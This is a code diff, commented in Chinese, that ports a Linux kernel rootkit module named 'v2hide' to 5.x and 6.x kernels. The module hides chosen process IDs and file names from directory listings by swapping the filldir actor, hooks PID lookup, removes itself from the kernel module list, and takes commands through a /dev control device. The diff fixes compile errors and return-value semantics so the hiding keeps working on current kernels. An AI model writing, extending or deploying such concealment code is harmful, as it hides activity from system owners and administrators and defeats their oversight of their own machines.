@@ -109,13 +109,19 @@ static ssize_t v2hide_strscpy(char *dst, const char *src, size_t len)
 #define v2hide_strscpy(d, s, l) strscpy((d), (s), (l))
 #endif
 
-/* 3.10 的 find_task_by_vpid 需要 rcu 保护 */
+/* find_task_by_vpid 在 5.x/6.x 内核里没有 EXPORT_SYMBOL，模块直接用会 modpost 失败：
+ *   ERROR: modpost: "find_task_by_vpid" [v2hide.ko] undefined!
+ * 改用导出的 pid_task(find_vpid(pid), PIDTYPE_PID) 等价查找（同样需要 rcu 保护）。 */
 static struct task_struct *v2hide_find_task(pid_t pid)
 {
 	struct task_struct *t;
 
 	rcu_read_lock();
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 6, 0)
+	t = pid_task(find_vpid(pid), PIDTYPE_PID);
+#else
 	t = find_task_by_vpid(pid);
+#endif
 	if (t)
 		get_task_struct(t);
 	rcu_read_unlock();
@@ -146,8 +152,12 @@ static int hide_from_self = 0;
 module_param(hide_from_self, int, 0644);
 MODULE_PARM_DESC(hide_from_self, "1 = hide even from the target process itself");
 
-static char *dev_name = "v2hide";
-module_param(dev_name, charp, 0644);
+/* dev_name 在内核 6.x 里是 device.h 导出的函数名（const char *dev_name(const struct device *)），
+ * 直接用它做变量名会与内核符号冲突：
+ *   error: 'dev_name' redeclared as different kind of symbol
+ * 内部变量改名，对外 module_param 名仍保持 dev_name，Go 侧传参不用动。 */
+static char *v2hide_dev_name = "v2hide";
+module_param_named(dev_name, v2hide_dev_name, charp, 0644);
 MODULE_PARM_DESC(dev_name, "control device name under /dev");
 
 /* ---------------- 隐藏集合 ---------------- */
@@ -207,7 +217,7 @@ static int name_is_hidden(const char *name, int namlen)
 
 	if (hide_module && !strcmp(buf, KBUILD_MODNAME))
 		return 1;
-	if (dev_name && !strcmp(buf, dev_name))
+	if (v2hide_dev_name && !strcmp(buf, v2hide_dev_name))
 		return 1;
 
 	if (buf[0] >= '0' && buf[0] <= '9') {
@@ -243,6 +253,21 @@ static int name_is_hidden(const char *name, int namlen)
 }
 
 /* ---------------- dir_context->actor 替换 ---------------- */
+/* 内核 6.1 起 filldir_t 的返回类型从 int 变成 bool，语义也跟着反了：
+ *   旧：0 = 已写入继续枚举，非 0 = 缓冲区满停止
+ *   新：true = 继续枚举，false = 停止
+ * 直接用 int 版在新内核上编译失败（-Werror=incompatible-pointer-types）；
+ * 硬套类型又会让「跳过隐藏项」变成「截断目录列表」，所以返回值和语义一起切换。 */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
+#define V2HIDE_ACTOR_T bool
+#define V2HIDE_ACTOR_CONTINUE true
+#define V2HIDE_ACTOR_STOP false
+#else
+#define V2HIDE_ACTOR_T int
+#define V2HIDE_ACTOR_CONTINUE 0
+#define V2HIDE_ACTOR_STOP 1
+#endif
+
 struct v2hide_frame {
 	struct dir_context *ctx;
 	filldir_t orig;
@@ -303,15 +328,15 @@ static void frame_pop(struct dir_context *ctx)
 	spin_unlock_irqrestore(&frame_lock, flags);
 }
 
-static int v2hide_actor(struct dir_context *ctx, const char *name, int namlen,
-			loff_t offset, u64 ino, unsigned int d_type)
+static V2HIDE_ACTOR_T v2hide_actor(struct dir_context *ctx, const char *name, int namlen,
+				   loff_t offset, u64 ino, unsigned int d_type)
 {
 	filldir_t orig = frame_orig(ctx);
 
 	if (!orig)
-		return 0; /* 没有原始 actor 时丢弃，避免递归 */
+		return V2HIDE_ACTOR_STOP; /* 没有原始 actor 时直接停，避免递归 */
 	if (name_is_hidden(name, namlen))
-		return 0; /* 返回 0 = 该目录项不写进用户态缓冲区 */
+		return V2HIDE_ACTOR_CONTINUE; /* 跳过该目录项，但枚举继续 */
 	return orig(ctx, name, namlen, offset, ino, d_type);
 }
 
@@ -426,6 +451,10 @@ static struct kretprobe pid_lookup_krp = {
 };
 
 /* ---------------- 控制设备 /dev/<dev_name> ---------------- */
+/* 前置声明必须在使用点之前：老代码把声明放在 v2hide_write 之后，
+ * 新内核（gcc 14 / -Werror=implicit-function-declaration）直接编译失败 */
+static void v2hide_restore_module(void);
+
 static ssize_t v2hide_write(struct file *file, const char __user *ubuf, size_t len, loff_t *off)
 {
 	char kbuf[64];
@@ -511,8 +540,6 @@ static struct miscdevice v2hide_miscdev = {
 /* ---------------- 模块自身隐藏 ---------------- */
 static struct list_head *mod_list_prev_saved;
 
-static void v2hide_restore_module(void);
-
 static void v2hide_hide_module(void)
 {
 	if (!hide_module)
@@ -542,8 +569,8 @@ static int __init v2hide_init(void)
 	if (target_pid > 0 && hidden_pid_count < V2HIDE_MAX_PIDS)
 		hidden_pids[hidden_pid_count++] = (pid_t)target_pid;
 
-	if (dev_name && *dev_name)
-		v2hide_miscdev.name = dev_name;
+	if (v2hide_dev_name && *v2hide_dev_name)
+		v2hide_miscdev.name = v2hide_dev_name;
 	ret = misc_register(&v2hide_miscdev);
 	if (ret) {
 		pr_err("v2hide: misc_register failed: %d\n", ret);
